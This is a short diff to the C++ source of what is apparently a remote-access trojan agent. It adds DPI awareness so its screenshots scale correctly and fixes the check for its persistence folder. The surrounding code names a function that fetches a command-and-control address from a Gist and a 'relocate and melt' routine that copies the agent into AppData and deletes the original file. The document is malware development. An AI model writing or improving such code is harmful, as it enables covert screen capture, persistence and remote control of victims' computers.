@@ -214,6 +214,11 @@ bool FetchC2AddressFromGist(const std::string& url, std::string& host, int& c2_p
 }
 #endif
 int main() {
+    // 0. SET DPI AWARENESS
+    // Fixes screenshot scaling issues on high-DPI displays (e.g. 125%, 150%)
+#ifdef _WIN32
+    SetProcessDPIAware();
+#endif
     // 1. RELOCATE AND MELT (Clone/Melt Feature)
     // Moves the agent to AppData and deletes the original file on first run.
 #ifdef _WIN32
@@ -389,9 +394,7 @@ int main() {
                 bool isPersistentDir = false;
                 if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
                     std::string persistentDir = std::string(appDataPath) + "\\" + PERSISTENCE_SUBDIR;
-                    char currentDir[MAX_PATH];
-                    GetCurrentDirectoryA(MAX_PATH, currentDir);
-                    if (std::string(currentDir).find(persistentDir) != std::string::npos) {
+                    if (std::string(currentExe).find(persistentDir) != std::string::npos) {
                         isPersistentDir = true;
                     }
                 }
